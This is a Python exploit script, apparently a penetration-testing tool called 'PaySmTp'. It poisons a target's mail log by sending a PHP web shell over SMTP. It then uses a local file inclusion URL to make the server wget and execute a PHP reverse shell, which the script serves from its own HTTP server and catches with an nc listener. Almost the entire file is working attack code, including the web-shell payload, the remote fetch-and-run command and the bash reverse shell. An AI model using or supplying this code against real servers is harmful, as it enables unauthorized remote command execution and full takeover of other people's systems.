#!/usr/bin/python3
import os
import sys
import socket
import random
import requests
import pyfiglet
import threading
import http.server
import socketserver
"""
PaySmTp(Payload SMTP)
Use: Youtube: https://youtu.be/maHX9gcie8E
"""


def banner():
    print (pyfiglet.figlet_format("#P4ySmTp#", font="slant"))
    print ("* version 1.0")
    print ("* Author: ron020")
    print ("* Use: python3 " + sys.argv[0] + " host port user")
    print ("* Example: python3 " + sys.argv[0] + " 192.168.0.10 25 www-data")
    print("")


def web_server_client():
    Handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", port_server), Handler)
    server_thread = threading.Thread(target=httpd.serve_forever)
    server_thread.daemon = True
    server_thread.start()
    client_thread = threading.Thread(target=conn_login)
    client_thread.start()
    os.system("nc -vnlp {}".format(port))
    os.system("rm reverse.php")
    httpd.shutdown()
    httpd.server_close()


def conn_login():
    url_req = '{a}&cmd=wget%20http://{b}:{c}/reverse.php%20-O%20/tmp/reverse.php;php%20/tmp/reverse.php'.format(a=url,
                                                                                                                b=ip,
                                                                                                                c=port_server)
    with requests.Session() as s:
        if quest == "y":
            # REDIRECT_URL_LOGIN
            redirect = requests.get(url)
            redirect_url = (redirect.url)
            # Edit Input Fields in a Form
            payload = {
                'username': '{}'.format(user),
                'password': '{}'.format(passwd),
                'submit': 'Login'
            }

            s.post(redirect_url, data=payload)
            s.get(url_req)

        elif quest == "n":
            s.get(url_req)


def payload_php():
    rev_php = "<?php $sock=fsockopen('{a}',{b});exec('/bin/bash -i <&3 >&3 2>&3');?>".format(a=str(ip), b=int(port))
    with open("reverse.php", "a") as reverse_php:
        reverse_php.write(rev_php)


try:

    if len(sys.argv) != 4:
        banner()

    else:
        banner()
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((sys.argv[1], int(sys.argv[2])))
        sock = (str(s.recv(1024)).replace("'", "").replace(r'\r\n', '').strip("b").strip("220"))
        print("+ Connected to: ", sock)
        print("+ Sending Payload...")

        s.send(bytes("helo " + sys.argv[1] + "\r\n", "utf-8"))
        s.send(bytes("MAIL FROM:<exploit>\r\n", "utf-8"))
        s.send(bytes("RCPT TO:<" + sys.argv[3] + ">\r\n", "utf-8"))
        s.send(bytes("DATA\r\n", "utf-8"))
        s.send(bytes("<?php system($_GET['cmd']);?>\r\n", "utf-8"))
        s.send(bytes(".\r\n", "utf-8"))
        s.send(bytes("QUIT\r\n", "utf-8"))
        print("* Payload Successful ")

        # REVERSE SHELL
        print(" ")
        print("+ ***Reverse_Shell***")

        quest = input("+ Login >  y : n : >> ")

        if quest == "y":
            url = input("+ URL/LFI: ")
            user = input("+ User: ")
            passwd = input("+ Password: ")
            ip = str(input("+ lhost: "))
            port = int(input("+ lport: "))
            payload_php()
            port_server = (random.randrange(80, 65535))
            web_server_client()

        elif quest == "n":
            url = input("+ URL/LFI: ")
            ip = str(input("+ lhost: "))
            port = int(input("+ lport: "))
            payload_php()
            port_server = (random.randrange(80, 65535))
            web_server_client()

        else:
            print("[!] Command not found [!]")


except:
    print("\n[!] Payload Failed [!]")
